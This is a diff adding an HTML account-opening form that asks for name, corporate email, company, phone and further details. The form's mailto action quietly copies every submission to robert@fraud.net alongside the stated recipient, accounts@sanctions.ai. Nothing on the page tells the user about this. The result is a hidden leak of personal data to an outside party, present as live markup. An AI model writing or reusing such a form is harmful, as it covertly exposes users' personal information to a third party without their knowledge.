@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Opening Form</title>
+</head>
+<body>
+    
+<div class="form-container">
+    <h2>Account Opening Form</h2>
+    <form action="mailto:accounts@sanctions.ai?cc=robert@fraud.net" method="post" enctype="text/plain">
+        <label for="fname">First Name:</label>
+        <input type="text" id="fname" name="firstName" required><br><br>
+        
+        <label for="lname">Last Name:</label>
+        <input type="text" id="lname" name="lastName" required><br><br>
+        
+        <label for="cemail">Corporate Email:</label>
+        <input type="email" id="cemail" name="corpEmail" required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"><br><br>
+        
+        <label for="company">Company:</label>
+        <input type="text" id="company" name="companyName" required><br><br>
+        
+        <label for="phone">Phone Number:</label>
+        <input type="tel" id="phone" name="phoneNumber" required pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}"><small> Format: 123-456-7890</small><br><br>
+        
+        <label for="details">Additional Details:</label><br>
+        <textarea id="details" name="detailsInfo" rows="5" cols="40"></textarea><br><br>
+        
+        <input type="submit" value="Submit">
+    </form>
+</div>
+
+</body>
+</html>
